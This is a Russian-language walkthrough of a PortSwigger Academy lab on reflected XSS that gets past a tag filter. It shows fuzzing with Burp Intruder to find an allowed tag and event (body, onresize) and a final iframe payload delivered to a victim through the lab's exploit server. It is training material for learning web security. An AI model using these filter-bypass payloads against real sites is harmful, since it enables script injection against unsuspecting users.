зайдем на уязвимый ресурс, и введем в строку поиска 
```
<img src=1 onerror=alert(1)>
```
и найдем этот запрос в прокси хттп хистори данный запрос
```
GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E
```
и увидим, что тэг заблокирован
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/1.png)
причем что удивительно, запрос `<>` спокойно проходит
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/2.png)
отправим запрос в `Intruder`
```
GET /?search=<§§>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/3.png)
и выберем листы из читлиста 
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```
и вставим их в `Simple list`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/4.png)

запустим атаку и увидим, что `body` выдал максимальную длину ответа, и что его пропустило веб-приложение
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/5.png)
отлично, изменим запрос в интрудере на 
```
GET /?search=<body%20§§>
```
и в пэйлоады уже вставим события из колонки `events` читлиста 
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/6.png)

и видим, что нам выдало 4 претендента на победу

`Onresize`
`onscrollend`
`onbeforeinput`
`onbeforetoggle`

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/7.png)
соответсвенно, перейдем в `go exploit server`
и введем
```
<iframe src="https://0a9b000303c06459871d12cc00330081.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
и нажмем `Srore`, `deliver exloit to victim` и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/13.%20%D0%A1ross-site%20scripting%20(XSS)/11.%20Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/pics%20for%20walktrough/8.png)
